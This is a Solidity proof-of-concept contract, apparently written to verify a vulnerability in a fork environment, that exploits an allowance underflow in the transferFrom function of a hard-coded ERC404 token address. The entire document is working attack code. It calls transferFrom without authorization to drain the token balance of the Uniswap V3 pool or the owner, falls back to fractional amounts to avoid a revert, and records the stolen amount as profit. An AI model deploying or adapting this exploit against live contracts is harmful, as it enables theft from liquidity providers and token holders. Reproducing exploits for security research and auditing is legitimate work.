// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IPandoraERC404 {
    function owner() external view returns (address);
    function decimals() external view returns (uint8);
    function minted() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function whitelist(address account) external view returns (bool);
    function _uniswapV3Pool() external view returns (address);
    function transferFrom(address from, address to, uint256 amountOrId) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xddaDF1bf44363D07E750C20219C2347Ed7D826b9;

    uint256 private _profit;

    constructor() {}

    function executeOnOpportunity() public {
        IPandoraERC404 token = IPandoraERC404(TARGET);
        uint256 minted_ = token.minted();
        uint256 unit = 10 ** uint256(token.decimals());

        // Preferred victim is the already-configured pool because comments and logic
        // indicate pools/routers are expected to be whitelisted, which bypasses the
        // later burn loop and preserves the exact underflow transferFrom exploit path.
        address pool = token._uniswapV3Pool();
        if (_attemptDrain(token, pool, minted_, unit)) {
            _syncProfit();
            return;
        }

        // If the pool path is concretely infeasible at this fork state, fall back to
        // another existing on-chain holder discovered from public state without changing
        // the exploit root cause: raw allowance underflow in ERC20 transferFrom.
        address owner_ = token.owner();
        if (owner_ != pool && _attemptDrain(token, owner_, minted_, unit)) {
            _syncProfit();
            return;
        }

        _syncProfit();
    }

    function profitToken() external pure returns (address) {
        return TARGET;
    }

    function profitAmount() external view returns (uint256) {
        return _profit;
    }

    function _attemptDrain(
        IPandoraERC404 token,
        address victim,
        uint256 minted_,
        uint256 unit
    ) internal returns (bool) {
        if (victim == address(0) || victim == address(this)) {
            return false;
        }

        uint256 balance = token.balanceOf(victim);
        if (balance <= minted_) {
            // ERC20 branch requires amount > minted. If the victim balance does not
            // exceed minted at this fork block, this path is mechanically unavailable.
            return false;
        }

        // Stage 1-3 from the hypothesis: call transferFrom(victim, attacker, amount)
        // with amount > minted while allowance[victim][this] is expected to be zero.
        // A successful call proves the unchecked allowance decrement underflowed and
        // control continued into _transfer without a valid authorization check.
        if (_rawTransferFrom(token, victim, balance)) {
            return true;
        }

        // If the victim is not whitelisted, a whole-unit drain can revert inside the
        // later burn loop when the victim does not own enough NFTs. The finding allows
        // this constraint. In that case, try only the fractional remainder, which keeps
        // balanceBefore/unit unchanged while still satisfying amount > minted.
        uint256 remainder = balance % unit;
        if (remainder > minted_ && _rawTransferFrom(token, victim, remainder)) {
            return true;
        }

        return false;
    }

    function _rawTransferFrom(
        IPandoraERC404 token,
        address from,
        uint256 amount
    ) internal returns (bool ok) {
        (ok, ) = address(token).call(
            abi.encodeWithSelector(token.transferFrom.selector, from, address(this), amount)
        );
    }

    function _syncProfit() internal {
        _profit = IPandoraERC404(TARGET).balanceOf(address(this));
    }
}
